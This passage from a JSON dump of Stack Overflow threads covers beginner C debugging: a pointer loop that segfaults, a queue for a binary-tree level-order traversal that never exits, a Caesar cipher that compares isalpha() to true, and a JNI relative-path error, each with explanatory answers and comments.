y++;\n}\n</code></pre>\n\n<p>should just be:</p>\n\n<pre><code>printf(\"%s\",y);\n</code></pre>\n\n<p>or another option:</p>\n\n<pre><code>printf(\"%s\",colonptr);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 71, "user_id": 6262982, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d591ceb609bb526228030aeac7d6812f?s=128&d=identicon&r=PG&f=1", "display_name": "emuterisa", "link": "https://stackoverflow.com/users/6262982/emuterisa"}, "edited": false, "score": 0, "creation_date": 1461783498, "post_id": 36898185, "comment_id": 61361304, "body": "Interesting explanation, yes I was meant to write:  while(*y != &#39;\\0&#39;) and ye it is abit odd now that I think of it. Thanks alot!"}, {"owner": {"reputation": 918, "user_id": 2133905, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/Y4wcC.jpg?s=128&g=1", "display_name": "SGM1", "link": "https://stackoverflow.com/users/2133905/sgm1"}, "reply_to_user": {"reputation": 71, "user_id": 6262982, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d591ceb609bb526228030aeac7d6812f?s=128&d=identicon&r=PG&f=1", "display_name": "emuterisa", "link": "https://stackoverflow.com/users/6262982/emuterisa"}, "edited": false, "score": 0, "creation_date": 1461955953, "post_id": 36898185, "comment_id": 61449621, "body": "@emuterisa <code>printf</code> prints out the string up through the null character. There is no need to loop. If you wanted to loop and print a single character then you can do <code>printf(&quot;%c&quot;,*y);</code> and keep the loop. Again this is pointless when compared to do it he <code>printf(&quot;%s&quot;,y);</code> without the loop."}], "tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": false, "score": 0, "last_activity_date": 1461782148, "creation_date": 1461782148, "answer_id": 36898185, "question_id": 36897560, "link": "https://stackoverflow.com/questions/36897560/removing-a-character-from-a-string-in-c/36898185#36898185", "title": "Removing a character from a string in C", "body": "<p>In his now-deleted answer, @Giorgi pointed out this fragment of your code, which is valid C, but is nevertheless quite wrong:</p>\n\n<pre><code>while(y != '\\0')\n{\n    printf(\"%s\",y);\n    y++;\n}\n</code></pre>\n\n<p>Variable <code>y</code> is a pointer to <code>char</code>, so <code>while (y != '\\0')</code> is equivalent to <code>while (y != NULL)</code>, which some people would prefer to write as simply <code>while (y)</code>.  C does not define any way in which incrementing a non-null pointer will yield a null pointer, so if the behavior otherwise were well defined then this loop would never exit.</p>\n\n<p>In fact, however, the body of the loop dereferences <code>y</code> (indirectly, via <code>printf()</code>) and increments it.  Before too many iterations, <code>y</code> will point outside the memory allocated to the object it originally pointed (in)to, and after that, the behavior of dereferencing it is undefined.  A segmentation fault is a common observed outcome of this particular kind of UB.</p>\n\n<p>I suspect that you meant to write <code>while(*y != '\\0')</code>, but that still seems odd, for you would end up printing a sequence of tails of the string, whereas it seems you want to print just one string.  In that case, it is unclear to me why you are using a loop here at all.  What's wrong with simply</p>\n\n<pre><code>printf(\"%s\",y);\n</code></pre>\n\n<p>?</p>\n\n<p>Of course, that's not the only thing wrong with your code, as has been pointed out in comments, but it likely explains the segmentation fault that is the subject of your actual question.</p>\n"}], "owner": {"reputation": 71, "user_id": 6262982, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d591ceb609bb526228030aeac7d6812f?s=128&d=identicon&r=PG&f=1", "display_name": "emuterisa", "link": "https://stackoverflow.com/users/6262982/emuterisa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 90, "favorite_count": 1, "answer_count": 2, "score": 0, "last_activity_date": 1461782148, "creation_date": 1461780230, "last_edit_date": 1461780827, "question_id": 36897560, "link": "https://stackoverflow.com/questions/36897560/removing-a-character-from-a-string-in-c", "title": "Removing a character from a string in C", "body": "<p>So I'm doing a past paper question about functions/characters/pointers. I've come across a problem in my code and need help understanding it. </p>\n\n<p>More specifically, I am having problems with question B) ii), which requires me removing a colon from a string. </p>\n\n<p>My idea was to take the string, make a pointer and point directly to the colon, then replace this colon with the next character that proceeds it. Then replacing the other characters after the colon with the character ahead of it, until it reaches NULL.</p>\n\n<p>When it comes to compiling, it compiles just fine, but gives me segmentation fault: 11 .What's going on? how can I fix this? Is there something I am not understanding? Thanks.</p>\n\n<p><a href=\"http://i.stack.imgur.com/kLdsW.png\" rel=\"nofollow\">Question </a></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n\nint locate_colon(char* x) //Question B) i)\n{\n    int i = 0;\n    while(*x != '\\0')\n    {\n        if(*x == ':')\n        {\n            return i;\n        }\n        i++;\n        x++;\n    }\n    return -1;\n}\n\nchar* remove_colon(char* x) //Question B) ii)\n{\n    int y,i,j;\n    y = locate_colon(x);\n    i =0;\n    j =1;\n    while(*x != '\\0')\n    {\n        x[y+i] = x[y+j];\n        i++;\n        j++;\n    }\n    return x;\n}\n\nint main() //Testing if functions work by running through compiler\n{\n    int x;\n    char colon[] = \"Colon: 123\";\n    char* colonptr;\n    colonptr = colon;\n    x = locate_colon(colonptr);\n    printf(\"%d\",x);\n\n    //B) ii)\n    char* y;\n    y = remove_colon(colonptr);\n    while(y != '\\0')\n    {\n        printf(\"%s\",y);\n        y++;\n    }\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "binary-tree"], "answers": [{"tags": [], "owner": {"reputation": 4974, "user_id": 2587816, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/d0ec5b10cbc8a9a5b707ea67ea60f84d?s=128&d=identicon&r=PG", "display_name": "Jiminion", "link": "https://stackoverflow.com/users/2587816/jiminion"}, "is_accepted": false, "score": 0, "last_activity_date": 1461781095, "creation_date": 1461781095, "answer_id": 36897845, "question_id": 36897500, "link": "https://stackoverflow.com/questions/36897500/binary-tree-level-order-traversal-using-queues/36897845#36897845", "title": "Binary Tree level order Traversal using queues?", "body": "<p>level_order should make recursive calls to itself, not to enqueue().</p>\n"}, {"comments": [{"owner": {"reputation": 107, "user_id": 5742388, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/52c7ad9704be39a814f03c3d59fc01b1?s=128&d=identicon&r=PG&f=1", "display_name": "Star Rider", "link": "https://stackoverflow.com/users/5742388/star-rider"}, "edited": false, "score": 0, "creation_date": 1461852142, "post_id": 36898293, "comment_id": 61395997, "body": "Thanks a lot for the help."}], "tags": [], "owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "is_accepted": true, "score": 1, "last_activity_date": 1461782530, "creation_date": 1461782530, "answer_id": 36898293, "question_id": 36897500, "link": "https://stackoverflow.com/questions/36897500/binary-tree-level-order-traversal-using-queues/36898293#36898293", "title": "Binary Tree level order Traversal using queues?", "body": "<p>Your enqueue-function is broken: You continue the loop until <code>ptr</code> is <code>NULL</code>, but inside the loop you do not change ptr at all!</p>\n\n<pre><code>  while(ptr!=NULL)\n    {\n            if(ptr-&gt;next==NULL)\n            {\n                ptr-&gt;next=new_node;\n                new_node-&gt;next=NULL;\n            }\n    }\n</code></pre>\n\n<p>Instead, you have to advance in the list with every iteration until you have reached its end:</p>\n\n<pre><code>    while(ptr!=NULL)\n    {\n            if(ptr-&gt;next==NULL)\n            {\n                ptr-&gt;next=new_node;\n                new_node-&gt;next=NULL;\n                break;\n            }\n            ptr = ptr-&gt;next;\n    }\n</code></pre>\n\n<p>This should fix the endless loop.</p>\n\n<p>Furthermore, you should move the initialization of <code>new_node-&gt;next</code> to directly after the <code>malloc()</code>, to have it initialized also in the case of <code>start == NULL</code>:</p>\n\n<pre><code>new_node=(struct queue*)malloc(sizeof(struct queue));\nnew_node-&gt;next = NULL;\nif(start==NULL)\n      start=new_node;\n</code></pre>\n"}], "owner": {"reputation": 107, "user_id": 5742388, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/52c7ad9704be39a814f03c3d59fc01b1?s=128&d=identicon&r=PG&f=1", "display_name": "Star Rider", "link": "https://stackoverflow.com/users/5742388/star-rider"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 678, "favorite_count": 0, "accepted_answer_id": 36898293, "answer_count": 2, "score": 0, "last_activity_date": 1461782530, "creation_date": 1461780048, "question_id": 36897500, "link": "https://stackoverflow.com/questions/36897500/binary-tree-level-order-traversal-using-queues", "title": "Binary Tree level order Traversal using queues?", "body": "<p>Please help me to find the mistake in my code.\nIn this program i have created a binary tree and i want to traverse in level order,using Queues.</p>\n\n<p>My output is stuck after printing first parent root.I think there's some mistakes i have made in the Queue functions.But i'm not able to find any mistakes.</p>\n\n<p>here is my code below:</p>\n\n<hr>\n\n<pre><code>                #include&lt;stdio.h&gt;\n                #include&lt;stdlib.h&gt;\n                struct node\n                {\n                    int data;\n                    struct node *left,*right;\n                };\n                struct node* create_root(int data)\n                {\n                struct node *root=(struct node*)malloc(sizeof(struct node));\n                    root-&gt;data=data;\n                    root-&gt;left=root-&gt;right=NULL;\n                    return root;\n                }\n                struct node* create_tree(int data,struct node *root)\n                {\n                    char ch;\n                 if(root==NULL)\n                        return create_root(data);\n\n                     printf(\"\\nEnter R/L of %d ? \",root-&gt;data);\n                     fflush(stdin);\n                     scanf(\"%c\",&amp;ch);\n                    if(ch=='R' || ch=='r')\n                        root-&gt;right=create_tree(data,root-&gt;right);\n                    else\n                        root-&gt;left=create_tree(data,root-&gt;left);\n\n                 return root;\n                }\n                struct queue\n                {\n                    struct node *info;\n                    struct queue *next;\n                };\n                struct queue *start=NULL;\n                struct queue* enQueue(struct node *root)\n                {\n                    struct queue *new_node,*ptr;\n                    new_node=(struct queue*)malloc(sizeof(struct queue));\n                    if(start==NULL)\n                        start=new_node;\n                    else\n                    {\n                        ptr=start;\n                        while(ptr!=NULL)\n                        {\n                                if(ptr-&gt;next==NULL)\n                                {\n                                    ptr-&gt;next=new_node;\n                                    new_node-&gt;next=NULL;\n                                }\n                        }\n                    }\n                    new_node-&gt;info=root;\n                    return start;\n                }\n                struct queue* deQueue()\n                {\n                 struct queue *temp;\n                        if(start==NULL)\n                        {\n                            printf(\"\\nEmpty!!!!!\");\n                            return;\n                        }\n                        temp=start;\n                        if(start-&gt;next==NULL) start=NULL;\n                        else start=start-&gt;next;\n                        return temp;\n\n                }\n                int isEmpty()\n                {\n                    if(start==NULL)\n                        return 1;\n                    else\n                        return 0;\n                }\n                void level_order(struct node *root)\n                {\n                    struct queue *ptr;\n                    if(root==NULL)\n                    {\n                        printf(\"\\nEmpty!!!!!\");\n                        return ;\n                    }\n                    start=enQueue(root);\n                    while(!isEmpty())\n                    {\n                        ptr=deQueue();\n                        printf(\"%d \",ptr-&gt;info-&gt;data);\n\n                        if(ptr-&gt;info-&gt;left)\n                            enQueue(ptr-&gt;info-&gt;left);\n                        else if(ptr-&gt;info-&gt;right)\n                            enQueue(ptr-&gt;info-&gt;right);\n\n                    }\n                }\n                int main()\n                {\n                    int n=0,num;\n                    struct node *root=NULL;\n                    printf(\"\\nEnter data:\");\n                    scanf(\"%d\",&amp;num);\n                    root=create_tree(num,root);\n                    while(n&lt;5)\n                    {\n                     printf(\"\\nEnter data:\");\n                     scanf(\"%d\",&amp;num);\n                     create_tree(num,root);\n                     n++;\n                    }\n                    level_order(root);\n                    return 0;\n                }\n</code></pre>\n"}, {"tags": ["c", "encryption", "cs50", "caesar-cipher"], "comments": [{"owner": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "edited": false, "score": 0, "creation_date": 1461779059, "post_id": 36897134, "comment_id": 61358468, "body": "Are you using C or C++.  You say C but you tagged as C++."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1461779253, "post_id": 36897134, "comment_id": 61358577, "body": "Have you tried debugging it?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1461779366, "post_id": 36897134, "comment_id": 61358646, "body": "And unrelated to your problem, but please try to avoid <a href=\"https://en.wikipedia.org/wiki/Magic_number_%28programming%29\" rel=\"nofollow noreferrer\"><i>magic numbers</i></a>, like for example <code>65</code>. Use proper character literals like <code>&#39;A&#39;</code> instead."}, {"owner": {"reputation": 21464, "user_id": 257645, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/SE5gW.jpg?s=128&g=1", "display_name": "kfsone", "link": "https://stackoverflow.com/users/257645/kfsone"}, "edited": false, "score": 0, "creation_date": 1461779370, "post_id": 36897134, "comment_id": 61358649, "body": "Interesting, never seen <code>int main (int argc, string argv[])</code> before."}, {"owner": {"reputation": 28836, "user_id": 4581301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5580eebb22e2c65c9b2325d2276d92a?s=128&d=identicon&r=PG&f=1", "display_name": "user4581301", "link": "https://stackoverflow.com/users/4581301/user4581301"}, "edited": false, "score": 0, "creation_date": 1461779373, "post_id": 36897134, "comment_id": 61358653, "body": "Incomplete code. Possibly no one but your class has cs50.h. Your code will not compile without it."}, {"owner": {"reputation": 28836, "user_id": 4581301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5580eebb22e2c65c9b2325d2276d92a?s=128&d=identicon&r=PG&f=1", "display_name": "user4581301", "link": "https://stackoverflow.com/users/4581301/user4581301"}, "reply_to_user": {"reputation": 21464, "user_id": 257645, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/SE5gW.jpg?s=128&g=1", "display_name": "kfsone", "link": "https://stackoverflow.com/users/257645/kfsone"}, "edited": false, "score": 0, "creation_date": 1461779437, "post_id": 36897134, "comment_id": 61358700, "body": "@kfsone Agree. I suspect that <code>string</code> is a macro subsitition hidden inside cs50.h"}, {"owner": {"reputation": 43, "user_id": 4491373, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c194aaeef4635d3a3a954adf1ee7930e?s=128&d=identicon&r=PG&f=1", "display_name": "Hodor", "link": "https://stackoverflow.com/users/4491373/hodor"}, "reply_to_user": {"reputation": 21464, "user_id": 257645, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/SE5gW.jpg?s=128&g=1", "display_name": "kfsone", "link": "https://stackoverflow.com/users/257645/kfsone"}, "edited": false, "score": 0, "creation_date": 1461779794, "post_id": 36897134, "comment_id": 61358946, "body": "@kfsone yes &quot;string&quot; and &quot;GetString&quot; are the functions of cs50.h library."}, {"owner": {"reputation": 43, "user_id": 4491373, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c194aaeef4635d3a3a954adf1ee7930e?s=128&d=identicon&r=PG&f=1", "display_name": "Hodor", "link": "https://stackoverflow.com/users/4491373/hodor"}, "edited": false, "score": 0, "creation_date": 1461779892, "post_id": 36897134, "comment_id": 61359009, "body": "cs50.h is the class. I am compiling with it on &quot;cloud 9 cs50 ide&quot;."}, {"owner": {"reputation": 43, "user_id": 4491373, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c194aaeef4635d3a3a954adf1ee7930e?s=128&d=identicon&r=PG&f=1", "display_name": "Hodor", "link": "https://stackoverflow.com/users/4491373/hodor"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1461780039, "post_id": 36897134, "comment_id": 61359119, "body": "@JoachimPileborg How would I use &#39;A&#39; instead of &quot;p[i]&quot; in the loop."}, {"owner": {"reputation": 28836, "user_id": 4581301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5580eebb22e2c65c9b2325d2276d92a?s=128&d=identicon&r=PG&f=1", "display_name": "user4581301", "link": "https://stackoverflow.com/users/4581301/user4581301"}, "edited": false, "score": 0, "creation_date": 1461780068, "post_id": 36897134, "comment_id": 61359142, "body": "Warning on terminology. cs50.h is a header file, not a class. It may contain a class among other things. <code>string</code> cannot be a function based on the way it is being used. In cs50.h there is most likely a line something like <code>#define string char *</code>"}, {"owner": {"reputation": 28836, "user_id": 4581301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5580eebb22e2c65c9b2325d2276d92a?s=128&d=identicon&r=PG&f=1", "display_name": "user4581301", "link": "https://stackoverflow.com/users/4581301/user4581301"}, "edited": false, "score": 0, "creation_date": 1461780170, "post_id": 36897134, "comment_id": 61359205, "body": "Example of what Joachim Pileborg is suggesting: <code>alpha = p[i] - 65;</code> would be <code>alpha = p[i] - &#39;A&#39;;</code>"}, {"owner": {"reputation": 43, "user_id": 4491373, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c194aaeef4635d3a3a954adf1ee7930e?s=128&d=identicon&r=PG&f=1", "display_name": "Hodor", "link": "https://stackoverflow.com/users/4491373/hodor"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461780430, "post_id": 36897134, "comment_id": 61359345, "body": "@WeatherVane I wrote all this code by myself. Sorry about this my English is grammatically not very well."}, {"owner": {"reputation": 43, "user_id": 4491373, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c194aaeef4635d3a3a954adf1ee7930e?s=128&d=identicon&r=PG&f=1", "display_name": "Hodor", "link": "https://stackoverflow.com/users/4491373/hodor"}, "reply_to_user": {"reputation": 28836, "user_id": 4581301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5580eebb22e2c65c9b2325d2276d92a?s=128&d=identicon&r=PG&f=1", "display_name": "user4581301", "link": "https://stackoverflow.com/users/4581301/user4581301"}, "edited": false, "score": 0, "creation_date": 1461780526, "post_id": 36897134, "comment_id": 61359387, "body": "@user4581301 Thank You! Let me try this. I will let u know what happens."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461780621, "post_id": 36897134, "comment_id": 61359447, "body": "@Saad my apologies too for misunderstanding."}, {"owner": {"reputation": 43, "user_id": 4491373, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c194aaeef4635d3a3a954adf1ee7930e?s=128&d=identicon&r=PG&f=1", "display_name": "Hodor", "link": "https://stackoverflow.com/users/4491373/hodor"}, "reply_to_user": {"reputation": 28836, "user_id": 4581301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5580eebb22e2c65c9b2325d2276d92a?s=128&d=identicon&r=PG&f=1", "display_name": "user4581301", "link": "https://stackoverflow.com/users/4581301/user4581301"}, "edited": false, "score": 0, "creation_date": 1461780709, "post_id": 36897134, "comment_id": 61359512, "body": "@user4581301 The CS50 Library is a suite of C, Ruby, PHP, and Python code designed to simplify certain tasks, particularly user input (for C) and authentication (for PHP, Python, and Ruby). Source: &quot;<a href=\"https://manual.cs50.net/library/\" rel=\"nofollow noreferrer\">manual.cs50.net/library</a>&quot;."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461780832, "post_id": 36897134, "comment_id": 61359590, "body": "Also on magic numbers, you can replace <code>97</code> with <code>&#39;a&#39;</code>."}, {"owner": {"reputation": 28836, "user_id": 4581301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5580eebb22e2c65c9b2325d2276d92a?s=128&d=identicon&r=PG&f=1", "display_name": "user4581301", "link": "https://stackoverflow.com/users/4581301/user4581301"}, "edited": false, "score": 0, "creation_date": 1461781021, "post_id": 36897134, "comment_id": 61359719, "body": "It&#39;s less primitive than I suspected: <code>typedef char* string;</code> and it answers one of the earliest questions posed in the comments. This is C, not C++. You won&#39;t get any classes here. Be careful if you use this header with C++ code, and most definitely do not <code>using namespace std;</code> or you&#39;ll have a naming conflict between <code>string</code>s."}], "answers": [{"comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461780959, "post_id": 36897385, "comment_id": 61359675, "body": "I never use the bool additions to C, this is one reason why. <code>0</code> is false, anything else is true. <code>if (isalpha (p[i]) != false)</code> is unnecessarily clumsy, when the language idiom is <code>if (isalpha (p[i]))</code>."}, {"owner": {"reputation": 2174, "user_id": 5398184, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe5626580b435c284cf0605e15f32?s=128&d=identicon&r=PG", "display_name": "Biruk Abebe", "link": "https://stackoverflow.com/users/5398184/biruk-abebe"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461781234, "post_id": 36897385, "comment_id": 61359854, "body": "@Weather Vane Exactly!"}, {"owner": {"reputation": 43, "user_id": 4491373, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c194aaeef4635d3a3a954adf1ee7930e?s=128&d=identicon&r=PG&f=1", "display_name": "Hodor", "link": "https://stackoverflow.com/users/4491373/hodor"}, "reply_to_user": {"reputation": 21464, "user_id": 257645, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/SE5gW.jpg?s=128&g=1", "display_name": "kfsone", "link": "https://stackoverflow.com/users/257645/kfsone"}, "edited": false, "score": 0, "creation_date": 1461785936, "post_id": 36897385, "comment_id": 61362842, "body": "@kfsone you should make this answer. It solved my issue."}], "tags": [], "owner": {"reputation": 2174, "user_id": 5398184, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe5626580b435c284cf0605e15f32?s=128&d=identicon&r=PG", "display_name": "Biruk Abebe", "link": "https://stackoverflow.com/users/5398184/biruk-abebe"}, "is_accepted": false, "score": 2, "last_activity_date": 1461784167, "last_edit_date": 1461784167, "creation_date": 1461779718, "answer_id": 36897385, "question_id": 36897134, "link": "https://stackoverflow.com/questions/36897134/caesar-s-cipher-encryption-program-in-c/36897385#36897385", "title": "Caesar\u2019s cipher encryption program in C", "body": "<p>From documentation of <a href=\"http://en.cppreference.com/w/cpp/string/byte/isalpha\" rel=\"nofollow\"><code>isalpha</code></a></p>\n\n<blockquote>\n  <p>Each of these routines returns <strong>nonzero</strong> if c is a particular\n  representation of an alphabetic character</p>\n</blockquote>\n\n<p>So when you say <code>if (isalpha (p[i]) == true)</code> you are comparing what ever <strong>non-zero</strong> value returned by <code>isalpha()</code>(<strong>which may not be 1</strong>) with <strong>1</strong>(<code>true</code>) which may not hold true and that <code>if</code> block will not be executed. The same goes for <code>isupper()</code>. So basically i don't think the equation is giving you zero, its just the <code>if</code> block the equation is in is not being executed.</p>\n\n<p>You may want to do:</p>\n\n<pre><code>if (isalpha(p[i])\n{\n\n   if (isupper(p[i])\n   {\n      //your code\n   }\n   ...//your code\n}\n</code></pre>\n"}], "owner": {"reputation": 43, "user_id": 4491373, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c194aaeef4635d3a3a954adf1ee7930e?s=128&d=identicon&r=PG&f=1", "display_name": "Hodor", "link": "https://stackoverflow.com/users/4491373/hodor"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 684, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1472433932, "creation_date": 1461778936, "last_edit_date": 1472433932, "question_id": 36897134, "link": "https://stackoverflow.com/questions/36897134/caesar-s-cipher-encryption-program-in-c", "title": "Caesar\u2019s cipher encryption program in C", "body": "<p>I am using this code for Caesar\u2019s cipher encryption program. c = (alpha + k) % 26; //c = cipher text ASCII code, \"alpha\" alphabet ASCII code, \"k\" key for cipher text; this equation gives me zero(0) on all the 26 alphabets.</p>\n\n<p>Thank You!</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;cs50.h&gt;\n#include &lt;string.h&gt;\n#include &lt;ctype.h&gt;\n\nint main (int argc, string argv[]) {\n\n    // took key from user and converted it to int\n    int k = atoi (argv[1]);\n\n    // get plaintext from user\n    string p = GetString ();\n\n    int c = 0, alpha = 0;\n\n    for (int i = 0, n = strlen(p); i &lt; n; i++)\n    {\n        // if it is alphabet else if not alphabet\n        if (isalpha (p[i]) == true) {\n\n            // if it is capital case else lower case\n            if (isupper(p[i]) == true) {\n                alpha = p[i] - 65;\n\n                // add key to plaintext then take modulas\n                c = (alpha + k) % 26;\n\n                alpha = c + 65;\n            } else {\n                alpha = p[i] - 97;\n\n                // add key to plaintext then take modulas\n                c = (alpha + k) % 26;\n\n                alpha = c + 97;\n            }\n\n        } else {\n            alpha = p[i];\n        }\n\n        printf(\"%c \\n\",  alpha);\n    }\n}\n</code></pre>\n"}, {"tags": ["java", "c", "file", "input", "java-native-interface"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1461778417, "post_id": 36896851, "comment_id": 61358053, "body": "You need to learn about <a href=\"http://en.cppreference.com/w/c/language/operator_precedence\" rel=\"nofollow noreferrer\"><i>operator precedence</i></a> because the expression <code>in = fopen(...) == NULL</code> doesn&#39;t do what you think it does."}, {"owner": {"reputation": 496316, "user_id": 57695, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/53ee9941b3fefef67175daf212e62d41?s=128&d=identicon&r=PG", "display_name": "Peter Lawrey", "link": "https://stackoverflow.com/users/57695/peter-lawrey"}, "edited": false, "score": 0, "creation_date": 1461779113, "post_id": 36896851, "comment_id": 61358502, "body": "Are you sure the working directory is the same in both cases? Try using an absolute path."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 1, "creation_date": 1461787006, "post_id": 36896851, "comment_id": 61363521, "body": "A perfect example of <i>why</i> <code>if(in = fopen(&quot;..&#47;maps&#47;example_map.txt&quot;, &quot;r&quot;) == NULL)</code> is <i>bad</i> code.  Do it in at least two lines:  <code>FILE *in = fopen(...); if ( in == NULL )...</code> and there&#39;s <i>no</i> way to make that mistake."}], "answers": [{"tags": [], "owner": {"reputation": 57, "user_id": 6256045, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ac655bd09f9aae2520c5d2f6c09cbbf9?s=128&d=identicon&r=PG&f=1", "display_name": "move", "link": "https://stackoverflow.com/users/6256045/move"}, "is_accepted": false, "score": 0, "last_activity_date": 1461778406, "creation_date": 1461778406, "answer_id": 36896957, "question_id": 36896851, "link": "https://stackoverflow.com/questions/36896851/crashing-when-reading-a-file-through-jni-but-successful-when-running-just-the-c/36896957#36896957", "title": "Crashing when reading a file through JNI but successful when running just the C element of code", "body": "<p>The reason why it wasn't working in case anyone else was has this issue, the problem was with the class path, the class path was relative and so it was from where the C file was, however it need to be from where the main java file was as that is where the code was being executed. </p>\n\n<p>Down to me keeping Java code in a file with two files one for maps and another for jni (C code), therefore the path that made the C work was \"../maps/example_map.txt\" and for the java code needed to be \"maps/example_map.txt\".</p>\n\n<p>Thought id leave it up incase anyone else ran into this problem. </p>\n"}], "owner": {"reputation": 57, "user_id": 6256045, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ac655bd09f9aae2520c5d2f6c09cbbf9?s=128&d=identicon&r=PG&f=1", "display_name": "move", "link": "https://stackoverflow.com/users/6256045/move"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 33, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1461778406, "creation_date": 1461778115, "question_id": 36896851, "link": "https://stackoverflow.com/questions/36896851/crashing-when-reading-a-file-through-jni-but-successful-when-running-just-the-c", "title": "Crashing when reading a file through JNI but successful when running just the C element of code", "body": "<p>i have a program that has java code 